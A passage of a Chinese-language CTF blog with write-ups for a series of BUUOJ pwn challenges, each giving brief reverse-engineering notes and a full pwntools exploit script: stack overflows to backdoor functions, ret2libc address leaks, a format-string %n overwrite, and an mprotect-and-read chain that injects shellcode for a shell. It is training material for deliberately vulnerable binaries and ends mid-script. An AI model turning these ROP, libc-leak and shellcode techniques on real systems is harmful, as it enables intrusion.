alt="image.png"></p><p>因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25675</span>)</span><br><span class="line">payload = ‘a<span class="string">&#x27; *(0x30-0x4) + p64(0x41348000)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>进入IDA发现存在后门函数和fgets函数，不过fgets函数限制了长度，这个长度无法造成溢出。但是在后面发现std::string::string函数，虽然不知道是干什么的但是根据名称猜测可能是由某字符串转变成另一字符串</p><p><img src="https://i.loli.net/2021/10/18/JxoN8SInPAMjXil.png" alt="屏幕截图 2021-10-18 200913.png"></p><p>进入gdb调试，发现输入的I经过std::string::string函数会转变成you，换句话说也就是1和字符转成3个字符，而要造成栈溢出需要0x3c如果通过转化可以达到要求，也就是需要20个’I’</p><p><img src="https://i.loli.net/2021/10/18/CcGNzTIEBi6pae2.png" alt="屏幕截图 2021-10-18 201902.png"></p><p>之后就很简单了，通过转换造成栈溢出，跳转到后门函数获取shell</p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26513</span>)</span><br><span class="line">get_shell = <span class="number">0x8048F13</span></span><br><span class="line">payload1 = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(get_shell)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/18/PKQuUJaveh5cE8n.png" alt="image.png"></p><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>简单的栈溢出，直接上exp</p><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level0&#x27;</span>)</span><br><span class="line">get_shell = <span class="number">0x40059A</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(get_shell)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>使用IDA打开，在加密函数中存在危险函数gets，可以造成栈溢出。因为没有system以及bin/sh字符串，所以采取libc泄露来做此题</p><p><img src="https://i.loli.net/2021/10/18/dpC6UmnwKf4E7Il.png" alt="屏幕截图 2021-10-18 193913.png"></p><p>所以基本思路就是运行两次，先泄露函数地址获得libc，计算得到system函数和bin/sh字符串地址，第二次运行执行system函数获得shell</p><p>payload1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)：目的是让堆栈对齐</p><h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25488)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">start_addr=elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400c83</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.info(<span class="string">&#x27;puts_addr==&gt;%#x&#x27;</span>,puts_addr)</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> libcbase</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">ret_addr=<span class="number">0x4006b9</span></span><br><span class="line">payload2=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>32位程序，有一个输入，之后判断var[13]是否等于17，如果等于17就执行system函数，而我们的输入会存储到var中，所以只要我们输入到var[13]时的值为17就可以</p><p><img src="https://i.loli.net/2021/10/25/sn18qJwGASbNoEx.png" alt="image.png"></p><h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27044</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">13</span>+p32(<span class="number">17</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>查看反汇编代码，很明显存在栈溢出，同时还存在后门函数，这个函数会读取flag.txt文件到fl4g地址。<img src="https://i.loli.net/2021/10/25/iJzlBGpfet5ubDr.png" alt="image.png"></p><p>不仅如此，程序还存在write函数<img src="https://i.loli.net/2021/10/25/lrVEjdo7vGH4UYR.png" alt="image.png"></p><p>所以思路就是通过栈溢出跳转到后门函数之后执行write函数泄露对应地址的flag</p><h2 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26667</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">flag = <span class="number">0x80ECA2D</span></span><br><span class="line">get_flag = <span class="number">0x80489A0</span></span><br><span class="line">write_addr = <span class="number">0x806E270</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">45</span>+p32(get_flag)+p32(write_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h1><p>拿到题目分析程序，首先程序会从/dev/urandom读取随机数，写入到buf中</p><p><img src="https://i.loli.net/2021/11/06/iw2WQroHbNgaeLh.png" alt="image.png"></p><p>接下来会将随机数写入s中，再将我们输入的数写到buf中，比较buf和s，如果不同就退出，相同就返回v5</p><p><img src="https://i.loli.net/2021/11/06/nvAL5Rj6XcIW2ko.png" alt="image.png"></p><p>接下来判断v5是否等于127等于就允许输入0xc8个字节，不同就输入v5个字节</p><p><img src="https://i.loli.net/2021/11/06/fyevZWqSgU5mLCT.png" alt="image.png"></p><p>很明显，在判断v5时存在栈溢出，只要v5够大就可以覆盖返回地址。所以接下来就是如何通过strncmp函数以及修改v5的值。<strong>strncmp匹配两个字符串时，如果一样就返回0，但是遇到\x00就会停止读取</strong>，所以我们可以输入\x00从而绕过strncmp函数。</p><p><img src="https://i.loli.net/2021/11/06/QojVMChR1Ilbxfd.png" alt="image.png"></p><p>很明显，输入buf时可以覆盖v5，所以可以利用溢出来修改v5为我们想要的值。最后就是简单的libc泄露了。</p><h2 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,29817)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/krito/CTF/libc-2.23.so&#x27;</span>)   <span class="comment"># 使用题目给的libc，本地调试时用自己的</span></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>一道典型的格式化字符串漏洞题，程序会读取随机数到unk_804C044，之后和我们输入的passwd进行对比，一样就可以获取shell</p><p><img src="https://i.loli.net/2021/11/06/8dfjM1mNSKBZn4l.png" alt="image.png"></p><p>虽然没有栈溢出，但是存在很明显的格式化字符串漏洞。我们可以将unk_804C044中的值修改成我们想修改的值，之后再输入那个值就可以。</p><p>计算偏移</p><p><img src="https://i.loli.net/2021/11/06/gT6yiFEXqf84RdW.png" alt="image.png"></p><p>所以payload=p32(target_addr) + ‘%10$n’，这样目标地址里面的值就会被修改成00000004，因为p32(target_addr) 是4字节，$n修改4字节。</p><h2 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn5&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28301</span>)</span><br><span class="line">target_addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(target_addr) + <span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x00000004</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>一开始以为是一道简单的栈溢出，本地也打通了，但是远端打不通，后面发现后门函数是假的，远端没有flag.txt，所以得换一种思路。</p><p>看到函数列表里面存在mprotect函数，通过这个函数我们可以修改指定内存段为可执行。之后控制程序去执行我们设计好的内存段。</p><p>寻找可写内存段</p><p><img src="https://i.loli.net/2021/11/08/pNdeEuH8vBr12Ds.png" alt="image.png"></p><p>寻找用于平衡堆栈的gadgets（因为mprotect函数和read函数参数个数都是3，所以需要三个pop）</p><p><img src="https://i.loli.net/2021/11/08/cr9uqxp1TJPebVS.png" alt="image.png"></p><p>所以我们的思路是：</p><ol><li>控制返回地址为mprotect，利用mprotect函数修改指定内存的权限，然后平衡堆栈</li><li>将mprotect函数的返回地址修改成read，利用read函数向目标段写入shellcode</li><li>最后利用read函数返回到设计好的内存段</li></ol><h2 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;, 25586)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">mem_addr = <span class="number">0x80ea000</span> </span><br><span class="line">pop3_ret = <span class="number">0x809e4c5</span>  <span class="comment"># ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27;</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 控制返回地址为mprotect，利用mprotect函数修改指定内存的权限</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span> </span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_ret)  <span class="comment"># 平衡堆栈</span></span><br><span class="line">payload += p32(mem_addr)  </span><br><span class="line">payload += p32(mem_size)</span><br><span class="line">payload += p32(mem_proc)  </span><br><span class="line">payload += p32(read_addr) </span><br><span class="line"><span class="comment"># 将mprotect函数的返回地址修改成read，执行read函数</span></span><br><span class="line">payload += p32(pop3_ret)  <span class="comment"># 平衡堆栈</span></span><br><span class="line">payload += p32(<span class="number">0</span>)    </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># 返回到我们构造好的内存段</span></span><br><span class="line">payload += p32(mem_addr)  </span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line">sh.interactive() </span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>就是一道简单的栈溢出，第一次输入的值作为第二次输入的最大值，所以第一次输入较大的值，第二次栈溢出到后门函数就可以。（第一次不要太大，我用0x100就报错了）</p><h2 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27736</span>)</span><br><span class="line">backdoor = <span class="number">0x4006E6</span></span><br><span class="line">payload1 = <span class="string">&#x27;100&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;[+]Please input the length of your name:\n&#x27;</span>,payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+]What&#x27;s u name?\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/08/K7dcsN1JIQVU5gp.png" alt="image.png"></p><h1 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h1><p>IDA打开发现第二个函数就存在栈溢出，看函数列表可以看到存在输出函数write，所以思路就是利用write函数泄露出函数地址获取libc从而得到system以及bin/sh的地址最后跳转执行</p><h2 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25468</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;2018_rop&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)  <span class="comment"># 泄露write函数地址返回地址为main函数</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">ret_addr = <span class="number">0x08048199</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(ret_addr)+p32(system_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh_addr)  <span class="comment"># ret用来平衡堆栈</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="babyrop-1"><a href="#babyrop-1" class="headerlink" title="babyrop"></a>babyrop</h1><p>就是简单的栈溢出，跳转执行system函数就行</p><h2 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,25222)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400683</span></span><br><span class="line">binsh_addr = <span class="number">0x00601048</span></span><br><span class="line">system_addr = <span class="number">0x400490</span></span><br><span class="line">ret_addr = <span class="number">0x0400479</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>和2018_rop一样，没什么区别</p><h2 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,26466)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0400733</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span 